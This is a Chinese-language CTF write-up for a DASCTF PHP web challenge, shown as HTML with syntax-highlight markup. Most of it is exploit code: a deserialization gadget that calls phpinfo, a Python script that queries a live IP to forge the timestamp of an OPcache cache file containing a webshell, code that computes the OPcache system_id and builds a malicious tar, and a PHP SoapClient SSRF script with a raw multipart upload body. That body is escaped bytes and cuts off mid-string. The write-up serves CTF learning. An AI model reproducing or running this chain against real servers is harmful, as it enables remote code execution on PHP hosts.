class="hljs-title">singles</span> <span class="hljs-title">organization</span>.&lt;<span class="hljs-title">br</span>&gt; <span class="hljs-title">S</span>* <span class="hljs-title">and</span> <span class="hljs-title">B</span>* ,<span class="hljs-title">both</span> <span class="hljs-title">of</span> <span class="hljs-title">them</span> <span class="hljs-title">have</span> <span class="hljs-title">the</span> <span class="hljs-title">kanozyo</span>.&lt;<span class="hljs-title">br</span>&gt; <span class="hljs-title">Now</span> <span class="hljs-title">revenge</span> <span class="hljs-title">to</span> <span class="hljs-title">them</span>!!!!!&lt;<span class="hljs-title">br</span>&gt; <span class="hljs-title">use</span> &#x27;$<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">LuckyE</span>&#x27;](<span class="hljs-title">__FILE__</span>);<span class="hljs-string">&#x27; to begin your revenge!!&lt;br&gt;</span><span class="hljs-string"> &lt;/p&gt;</span><span class="hljs-string"> &lt;/body&gt;</span><span class="hljs-string"> &lt;/html&gt;</span><span class="hljs-string"> &lt;?php</span><span class="hljs-string"> error_reporting(0);</span><span class="hljs-string"> class siroha&#123;</span><span class="hljs-string"> public $koi;</span><span class="hljs-string"> </span><span class="hljs-string"> public function __destruct()&#123;</span><span class="hljs-string"> $this-&gt;koi[&#x27;</span>zhanjiangdiyishenqing<span class="hljs-string">&#x27;]();</span><span class="hljs-string"> &#125;</span><span class="hljs-string"> &#125;</span><span class="hljs-string"> $kanozyo = $_GET[&#x27;</span>LuckyE<span class="hljs-string">&#x27;](__FILE__);</span><span class="hljs-string"> var_dump($kanozyo);</span><span class="hljs-string"> $suki = unserialize($_POST[&#x27;</span>suki<span class="hljs-string">&#x27;]);</span><span class="hljs-string"></span></code></pre></div><p>这里有个细节</p><div class="code-wrapper"><pre><code class="hljs php">&lt;title&gt;revenge to siranai.php&lt;/title&gt;</code></pre></div><p>提示还有<code>siranai.php</code>文件，Boogipop大佬直接卡死</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-variable">$allowed_ip</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-variable">$allowed_ip</span>) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;S* has the kanojo but you don&#x27;t&quot;</span>);&#125; <span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE); <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/x-tar&#x27;</span>)&#123; <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]); &#125;</code></pre></div><p>这里限制了<code>REMOTE_ADDR</code>，再加上<code>index.php</code>给出的那个类只能调用无参函数，那应该是要用<code>SoapClient</code>来打</p><p>信息收集</p><p>无参函数肯定先想到<code>phpinfo()</code></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<span class="hljs-variable">$a</span>-&gt;koi = [<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="hljs-string">&quot;phpinfo&quot;</span>];<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));</code></pre></div><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118000210914.png" alt="image-20240118000210914"></p><p>找到Opcache扩展，存在漏洞</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118000338853.png" alt="image-20240118000338853"></p><p><a href="https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/">https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/</a></p><p>本地起相同版本的php，安装扩展，index.php中写入一句话木马</p><p>并且把缓存文件<code>index.php.bin</code>下载下来</p><h3 id="获取时间戳"><a href="#获取时间戳" class="headerlink" title="获取时间戳"></a>获取时间戳</h3><p>通过<code>?LuckyE=filectime</code>获取当前文件的最后修改<strong>时间戳</strong> （太强了）</p><p>通过脚本改成合适的格式,在<code>index.php.bin</code>上修改时间戳</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> tarfile<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> osurl = <span class="hljs-string">&quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">timec</span>():    pattern = <span class="hljs-string">r&quot;\d&#123;10&#125;&quot;</span>    timeres = requests.get(url=url)    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;int\((\d&#123;10&#125;)\)&#x27;</span>, timeres.text)    <span class="hljs-comment"># 检查是否有匹配</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-comment"># 提取匹配到的数字</span>        ten_digit_number = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)        <span class="hljs-built_in">print</span>(ten_digit_number)        <span class="hljs-keyword">return</span>  ten_digit_number    <span class="hljs-keyword">except</span>:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dame&#x27;</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">split_string_into_pairs</span>(<span class="hljs-params">input_string</span>):    <span class="hljs-comment"># 检查输入字符串的长度</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_string) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;输入字符串的长度必须是偶数。&quot;</span>)    <span class="hljs-comment"># 使用切片操作将字符串分割成两位一组的子字符串</span>    pairs = [input_string[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(input_string), <span class="hljs-number">2</span>)]    <span class="hljs-keyword">return</span> pairs<span class="hljs-keyword">def</span> <span class="hljs-title function_">totime</span>(<span class="hljs-params">time</span>):    b = split_string_into_pairs(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(time))&#125;</span>&quot;</span>)    b.pop(<span class="hljs-number">0</span>)    s = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(b)):        s += b[-<span class="hljs-number">1</span>]        b.pop(-<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> s<span class="hljs-keyword">def</span> <span class="hljs-title function_">changetime</span>():    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.php.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file:        binary_data = file.read()        <span class="hljs-comment"># 将二进制数据转换为十六进制字符串</span>        hex_data = binascii.hexlify(binary_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)        new_data = hex_data[<span class="hljs-number">0</span>:<span class="hljs-number">128</span>]+totime(timec())+hex_data[<span class="hljs-number">136</span>:]        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.php.bin&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:            f.write(<span class="hljs-built_in">bytes</span>.fromhex(new_data))changetime()</code></pre></div><p>也可以手动修改</p><p>先转化格式，然后修改</p><p>第五行开始八个字节都是时间戳</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118001157576.png" alt="image-20240118001157576"></p><h3 id="获取system-id"><a href="#获取system-id" class="headerlink" title="获取system_id"></a>获取system_id</h3><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118001731562.png" alt="image-20240118001731562"></p><p>这两个信息算出<code>system_id</code></p><p>算出system_id,创建tar目录文件,&#x2F;tmp目录下路径为<code>/system_id/var/www/html/index.php.bin</code></p><div class="code-wrapper"><pre><code class="hljs Python">sys_id = hashlib.md5(<span class="hljs-string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<span class="hljs-built_in">print</span>(sys_id)<span class="hljs-keyword">def</span> <span class="hljs-title function_">tar_file</span>():    tar_filename = <span class="hljs-string">&#x27;exp.tar&#x27;</span>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_filename,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:        directory_info = tarfile.TarInfo(name=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)        directory_info.<span class="hljs-built_in">type</span> = tarfile.DIRTYPE        directory_info.mode = <span class="hljs-number">0o777</span>        tar.addfile(directory_info)        tar.add(<span class="hljs-string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</code></pre></div><p>接着获取SSRF的数据</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():    file = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read(),<span class="hljs-string">&quot;application/x-tar&quot;</span>)&#125;    res  = requests.post(url=url,files=file)    <span class="hljs-built_in">print</span>(res.request.headers)    <span class="hljs-keyword">return</span> res.requestrequest_content = upload()upload_body = <span class="hljs-built_in">str</span>(request_content.body).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)content_length = request_content.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]<span class="hljs-built_in">print</span>(content_length)<span class="hljs-built_in">print</span>(upload_body)</code></pre></div><p><code>index.php</code>可以调用任意无参方法,那么可以通过<code>SoapClient</code>的<code>__call</code>去SSRF,但是涉及到压缩包文件上传的报文伪造,处理起来比较麻烦,这里出题人就选择通过python去获取文件上传的数据,比较难看.</p><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118002154318.png" alt="image-20240118002154318"></p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;&#125;<span class="hljs-variable">$postdata</span> = <span class="hljs-string">&quot;--0f9486e921f5468f9ab50745c4c93267\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;exp.tar\&quot;\r\nContent-Type: application/x-tar\r\n\r\n214510e772fba140ea7a33a277f2799e/var/www/html/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000777\x000000000\x000000000\x0000000000000\x0000000000000\x00014543\x00 5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00././@PaxHeader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000000\x000000000\x000000000\x0000000000034\x0000000000000\x00010212\x00 x\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0028 mtime=1696745575.7742124\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000666\x000000000\x000000000\x0000000001700\x0014510444150\x00017165\x00 0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00OPCACHE\x00214510e772fba140ea7a33a277f2799ep\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa9\xf9 e\x00\x00\x00\x00\x07]1\xcd    \xd8\x01\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00badm\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00ibu.\xb0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00@\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80F\&quot;e\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00#olh\x99F\&quot;e\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xb2$\x83\xaf\xdd\xaa\xdf\x8c\x17\x00\x00\x00\x00\x00\x00\x00/var/www/html/index.php\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\&quot;@\xb0\xc5\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x90\x02\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00V\x00\x00\x00\xf9\xe0\xf8\xab\xb5\xd0\x00\x80\x07\x00\x00\x00\x00\x00\x00\x00phpinfo\x00\x02\x00\x00\x00V\x00\x00\x00jQ\xe3\x0e1\x00\x00\x80\x05\x00\x00\x00\x00\x00\x00\x00_POST\x00\x00\x00E\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00=\x00\x01\x00\x8b\x08\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x02\x00\x00\x00\x81\x00\x00\x007\x06\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff`\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00P\x01\x00\x02A\x06\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x02\x00\x00\x00P\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00Q\x02\x01\x02\xf1\x05\x00\x00\x00\x00\x00\x00P\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\x03\x00\x00\x00I\x02\x00\x00F\x05\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x03\x00\x00\x00&gt;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x